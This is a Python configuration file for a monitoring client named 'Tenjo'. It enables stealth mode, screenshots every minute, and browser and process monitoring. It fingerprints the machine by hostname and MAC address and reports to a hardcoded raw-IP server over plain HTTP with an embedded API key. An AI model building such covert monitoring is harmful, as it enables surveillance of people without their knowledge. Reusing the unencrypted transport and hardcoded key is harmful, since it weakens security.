# Tenjo Client Configuration for Yayasans-MacBook-Air.local
import os
import uuid
import socket
import platform
import json
from datetime import datetime

class Config:
    # Server Configuration
    SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://103.129.149.67")  # Production server
    # SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://127.0.0.1:8000")  # Local development server
    API_ENDPOINT = f"{SERVER_URL}/api"
    API_KEY = os.getenv('TENJO_API_KEY', "tenjo-api-key-2024")

    # Base paths for persistent storage
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    DATA_DIR = os.path.join(BASE_DIR, "data")
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    CLIENT_CONFIG_FILE = os.path.join(DATA_DIR, "client_config.json")

    @classmethod
    def _load_config(cls):
        """Load configuration from persistent storage"""
        if os.path.exists(cls.CLIENT_CONFIG_FILE):
            try:
                with open(cls.CLIENT_CONFIG_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}

    @classmethod
    def _save_config(cls, config_data):
        """Save configuration to persistent storage"""
        os.makedirs(cls.DATA_DIR, exist_ok=True)
        with open(cls.CLIENT_CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=2)

    @classmethod
    def generate_client_id(cls):
        """Generate unique client ID based on hardware"""
        import hashlib
        
        # Get unique identifiers
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
        
        # Create deterministic UUID based on hostname + MAC
        unique_string = f"{hostname}-{mac_address}"
        hash_object = hashlib.md5(unique_string.encode())
        
        # Convert to UUID format
        hex_dig = hash_object.hexdigest()
        client_uuid = f"{hex_dig[:8]}-{hex_dig[8:12]}-{hex_dig[12:16]}-{hex_dig[16:20]}-{hex_dig[20:32]}"
        
        return client_uuid

    @classmethod
    def get_client_id(cls):
        """Get persistent CLIENT_ID, generate if not exists"""
        config = cls._load_config()
        
        if 'client_id' not in config:
            # Generate new CLIENT_ID and save it
            config['client_id'] = cls.generate_client_id()
            cls._save_config(config)
        
        return config['client_id']

    @classmethod
    def save_client_config(cls, client_data):
        """Save client configuration data"""
        config = cls._load_config()
        config.update(client_data)
        cls._save_config(config)

    # Monitoring Settings
    SCREENSHOT_INTERVAL = int(os.getenv('TENJO_SCREENSHOT_INTERVAL', '60'))  # seconds
    BROWSER_CHECK_INTERVAL = 30  # seconds
    PROCESS_CHECK_INTERVAL = 45  # seconds

    # Features
    SCREENSHOT_ENABLED = True
    BROWSER_MONITORING = True
    PROCESS_MONITORING = True
    STEALTH_MODE = True

    # Client info
    CLIENT_NAME = socket.gethostname()
    CLIENT_USER = os.getenv('USER', os.getenv('USERNAME', 'unknown'))

    # Logging
    LOG_LEVEL = os.getenv('TENJO_LOG_LEVEL', "INFO")
    LOG_FILE = os.path.join(LOG_DIR, f"tenjo_client_{datetime.now().strftime('%Y%m%d')}.log")

    @classmethod
    def init_directories(cls):
        """Create directories if they don't exist"""
        os.makedirs(cls.LOG_DIR, exist_ok=True)
        os.makedirs(cls.DATA_DIR, exist_ok=True)

# Initialize directories and set CLIENT_ID
Config.init_directories()
Config.CLIENT_ID = Config.get_client_id()
